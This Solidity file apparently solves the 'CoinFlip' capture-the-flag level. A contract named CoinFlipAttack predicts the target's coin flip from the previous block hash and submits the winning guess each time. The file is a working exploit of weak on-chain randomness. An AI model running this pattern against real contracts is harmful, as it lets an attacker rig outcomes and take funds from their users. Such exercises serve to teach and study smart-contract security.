pragma solidity ^0.6.0;

import './CoinFlip.sol';

contract CoinFlipAttack {

    CoinFlip victim;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address addr) public {
        victim = CoinFlip(addr);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true : false;
        victim.flip(side);
    }

}
